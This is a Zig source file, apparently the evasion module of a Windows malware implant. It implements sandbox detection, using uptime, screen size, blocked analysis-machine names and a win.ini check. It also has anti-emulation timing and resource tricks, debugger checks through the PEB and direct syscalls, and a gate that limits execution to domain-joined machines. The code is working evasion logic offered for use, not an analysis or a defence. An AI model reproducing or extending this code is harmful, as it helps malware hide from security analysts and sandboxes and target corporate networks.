const std = @import("std");
const obf = @import("obf.zig");
const windows = std.os.windows;
const win = @import("win32.zig");
const config = @import("config.zig");
const syscalls = @import("syscalls.zig");

fn nx_contains_ci(haystack: []const u8, needle: []const u8) bool {
    if (needle.len == 0 or haystack.len < needle.len) return false;
    var index: usize = 0;
    while (index + needle.len <= haystack.len) : (index += 1) {
        var matches = true;
        var offset: usize = 0;
        while (offset < needle.len) : (offset += 1) {
            const a = std.ascii.toLower(haystack[index + offset]);
            const b = std.ascii.toLower(needle[offset]);
            if (a != b) {
                matches = false;
                break;
            }
        }
        if (matches) return true;
    }
    return false;
}

fn nx_computational_delay(milliseconds: u32) void {
    if (milliseconds == 0) return;
    var frequency: i64 = 0;
    var start: i64 = 0;
    var stop: i64 = 0;
    if (!win.QueryPerformanceFrequency(&frequency).toBool() or frequency == 0) {
        win.Sleep(milliseconds);
        return;
    }
    _ = win.QueryPerformanceCounter(&start);
    var fibonacci_a: u64 = 0;
    var fibonacci_b: u64 = 1;
    var steps: u64 = 0;
    while (true) {
        const fibonacci = fibonacci_a +% fibonacci_b;
        fibonacci_a = fibonacci_b;
        fibonacci_b = fibonacci;
        steps +%= 1;
        if ((steps & 0xFFFF) == 0) {
            _ = win.QueryPerformanceCounter(&stop);
            const elapsed: f64 = @as(f64, @floatFromInt(stop - start)) * 1000.0 /
                @as(f64, @floatFromInt(frequency));
            if (elapsed >= @as(f64, @floatFromInt(milliseconds))) break;
        }
        if (fibonacci < fibonacci_a) {
            fibonacci_a = 0;
            fibonacci_b = 1;
        }
    }
}

fn nx_anti_uptime() bool {
    var unbiased: u64 = 0;
    if (!win.QueryUnbiasedInterruptTime(&unbiased).toBool()) return true;
    const minutes = unbiased / 10_000_000 / 60;
    return minutes >= 30;
}

fn nx_anti_screen() bool {
    return win.GetSystemMetrics(0) >= 1024 and win.GetSystemMetrics(1) >= 768;
}

fn nx_anti_username() bool {
    var user: [256]u8 = @splat(0);
    var user_len: win.DWORD = user.len;
    _ = win.GetUserNameA(&user, &user_len);
    var computer: [256]u8 = @splat(0);
    var computer_len: win.DWORD = computer.len;
    _ = win.GetComputerNameA(&computer, &computer_len);

    const blocked = [_][]const u8{
        "wdagutilityaccount", "sandbox",     "cuckoo",   "malware",
        "maltest",            "tequilaboom", "infected", "virus",
    };
    for (blocked) |needle| {
        if (nx_contains_ci(&user, needle) or nx_contains_ci(&computer, needle)) return false;
    }
    return true;
}

fn nx_anti_file_checks() bool {
    const kernel32 = std.unicode.utf8ToUtf16LeStringLiteral("C:\\Windows\\System32\\kernel32.dll");
    if (win.GetFileAttributesW(kernel32.ptr) == win.INVALID_FILE_ATTRIBUTES) return false;

    const win_ini = std.unicode.utf8ToUtf16LeStringLiteral("C:\\Windows\\win.ini");
    const handle = win.CreateFileW(
        win_ini.ptr,
        win.GENERIC_READ,
        win.FILE_SHARE_READ,
        null,
        win.OPEN_EXISTING,
        0,
        null,
    );
    if (handle == win.INVALID_HANDLE_VALUE) return false;
    defer _ = win.CloseHandle(handle);

    var buffer: [4]u8 = @splat(0);
    var read: win.DWORD = 0;
    if (!win.ReadFile(handle, &buffer, buffer.len, &read, null).toBool() or read < 4)
        return false;
    return buffer[0] == ';' and buffer[1] == ' ' and
        (buffer[2] == 'f' or buffer[2] == 'F');
}

fn nx_anti_sandbox() bool {
    return nx_anti_uptime() and nx_anti_screen() and
        nx_anti_username() and nx_anti_file_checks();
}

fn nx_anti_timing() bool {
    const start = win.GetTickCount64();
    syscalls.nx_delay(2500);
    return win.GetTickCount64() - start >= 2200;
}

fn nx_anti_failed_call() bool {
    var counter: i64 = 0;
    while (counter < 1_000_000) : (counter += 1) {
        const value: usize = 0xF0000000 + @as(usize, @intCast(counter & 0xFF));
        _ = win.CloseHandle(@ptrFromInt(value));
    }
    return counter != 0;
}

fn nx_anti_env() bool {
    var user: [256]u8 = @splat(0);
    var user_len: win.DWORD = user.len;
    _ = win.GetUserNameA(&user, &user_len);
    if (user[0] == 0) return true;

    var expanded: [256]u8 = @splat(0);
    _ = win.ExpandEnvironmentStringsA("%USERNAME%", &expanded, expanded.len);
    if (!std.mem.eql(u8, std.mem.sliceTo(&user, 0), std.mem.sliceTo(&expanded, 0)))
        return false;

    var os_value: [256]u8 = @splat(0);
    _ = win.ExpandEnvironmentStringsA("%OS%", &os_value, os_value.len);
    if (!obf.eq(std.mem.sliceTo(&os_value, 0), "Windows_NT")) return false;

    var public_value: [256]u8 = @splat(0);
    _ = win.ExpandEnvironmentStringsA("%PUBLIC%", &public_value, public_value.len);
    return obf.eq(std.mem.sliceTo(&public_value, 0), "C:\\Users\\Public");
}

fn nx_anti_winapi() bool {
    if (win.OpenProcess(win.PROCESS_ALL_ACCESS, win.BOOL.FALSE, 4)) |handle| {
        _ = win.CloseHandle(handle);
    }

    if (win.CreateMemoryResourceNotification(0)) |handle| {
        const value = @intFromPtr(handle);
        _ = win.CloseHandle(handle);
        if (value < 40) return false;
    }

    if (win.VirtualAllocExNuma(
        win.GetCurrentProcess(),
        null,
        0x1000,
        win.MEM_RESERVE | win.MEM_COMMIT,
        win.PAGE_READWRITE,
        0,
    )) |memory| {
        _ = win.VirtualFree(memory, 0, win.MEM_RELEASE);
    } else {
        return false;
    }
    return true;
}

fn nx_anti_billion_steps() bool {
    var counter: i64 = 0;
    var index: i64 = 0;
    while (index < 100_000_000) : (index += 1) {
        counter +%= @mod(index, 3) - @mod(index, 5);
        counter ^= index << 1;
        counter *%= if (@mod(index, 2) == 0) -1 else 1;
    }
    return counter != 0;
}

fn nx_anti_large_alloc() bool {
    const size: usize = 256 * 1024 * 1024;
    const memory = win.VirtualAlloc(
        null,
        size,
        win.MEM_COMMIT | win.MEM_RESERVE,
        win.PAGE_READWRITE,
    ) orelse return false;
    defer _ = win.VirtualFree(memory, 0, win.MEM_RELEASE);
    const bytes: [*]u8 = @ptrCast(memory);
    var offset: usize = 0;
    while (offset < size) : (offset += 4096) bytes[offset] = 0x41;
    return true;
}

fn nx_anti_emulation() bool {
    return nx_anti_timing() and nx_anti_failed_call() and
        nx_anti_env() and nx_anti_winapi() and
        nx_anti_billion_steps() and nx_anti_large_alloc();
}

fn nx_domain_joined() bool {
    var name: ?[*:0]u16 = null;
    var status: u32 = 0;
    const rc = win.NetGetJoinInformation(null, &name, &status);
    if (name) |buffer| _ = win.NetApiBufferFree(buffer);
    return rc == 0 and status == 3; // NetSetupDomainName
}

fn nx_anti_debug() bool {
    if (windows.peb().BeingDebugged.toBool()) return false;
    const process = win.GetCurrentProcess();

    var debug_object: usize = 0;
    var returned: u32 = 0;
    if (syscalls.nx_query_process(process, 0x1E, &debug_object, @sizeOf(usize), &returned) == 0 and
        debug_object != 0) return false;

    var debug_port: usize = 0;
    if (syscalls.nx_query_process(process, 7, &debug_port, @sizeOf(usize), &returned) == 0 and
        debug_port != 0) return false;
    return true;
}

pub fn nx_run(cfg: config.NxConfig) bool {
    if (cfg.pre_sleep_seconds > 0)
        syscalls.nx_delay(@as(u64, cfg.pre_sleep_seconds) * 1000);
    if (cfg.enable_computational_delay)
        nx_computational_delay(3000);
    if (cfg.enable_anti_debug and !nx_anti_debug()) return false;
    if (cfg.require_domain_joined and !nx_domain_joined()) return false;
    if (cfg.enable_anti_sandbox and !nx_anti_sandbox()) return false;
    if (cfg.enable_anti_emulation and !nx_anti_emulation()) return false;
    return true;
}
